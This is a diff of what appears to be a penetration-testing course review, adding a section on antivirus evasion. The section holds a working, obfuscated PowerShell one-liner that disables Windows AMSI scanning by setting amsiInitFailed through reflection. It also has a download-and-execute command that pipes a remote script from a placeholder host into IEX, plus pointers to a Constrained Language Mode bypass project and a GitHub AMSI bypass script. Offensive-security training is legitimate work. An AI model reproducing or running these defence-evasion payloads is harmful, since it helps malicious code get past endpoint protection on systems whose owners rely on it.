@@ -6,15 +6,17 @@ I skipped about half the course. Certain sections I didnt really pay attention t
 
 Sheldons FullBypass.csproj covered by every need at any moment when I needed a powershell session without amsi or clm; all I had to do was execute it and I was golden. The newest things for me were Linux, SSH and MSSQL exploitation. I reccomend deeply engaging with labs 3 and 4 as those will cover these abundantly. 
 
-##Antivirus Bypass
+#Antivirus Bypass
 
 I only used two payloads if sheldons fullbypass.csproj didnt work or if I didnt need to bypass clm and so only needed to bypass amsi: 
 
 ```powershell
 S`eT-It`em ( 'V'+'aR' +  'IA' + (('b'+("{1}{0}"-f':1','lE'))+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f(('U'+'ti')+'l'),'A',('Am'+'si'),(('.'+'Man')+('ag'+'e')+('me'+'n')+'t.'),('u'+'to'+(("{1}{0}"-f 'io','mat')+'n.')),'s',(('Sys'+'t')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+('ms'+'i')),'d',('I'+('n'+'itF')+('a'+'ile'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+('t'+'at')),'i',(('N'+'on')+('Pu'+'bl')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
-This payload I had gotten from the crtp course and what not. The next payload I used is in my amsi bypass folder. That one can simply be executed via 
+The above one liner helps when I have shell access post CLM bypass.
 ```powershell
 IWR -UseBasicParsing http://ip/sidestep.ps1 | IEX
 ```
-You have two options; you either have no CLM and thus using the above script or one liner from the CRTP will instantly destroy amsi or you do have CLM, in which case you should use the FullBypass.csproj payload. It will work 70% of the time but sometimes AMSI is still present and so you will need to refer back to the one liner from above and keep running it till no more amsi. Simple, easy and clean. It really doesnt have to be all that complex and powershell reflection and all that to be able to quickly bypass amsi & clm
+In the situation I dont have direct shell access or dont have CLM but still am facing amsi then using the above command with https://github.com/raskolnikov90/LainAmsiOpenSession/blob/main/lainamsiopensession.ps1 You can bypass AMSI without issue : ) 
+
+
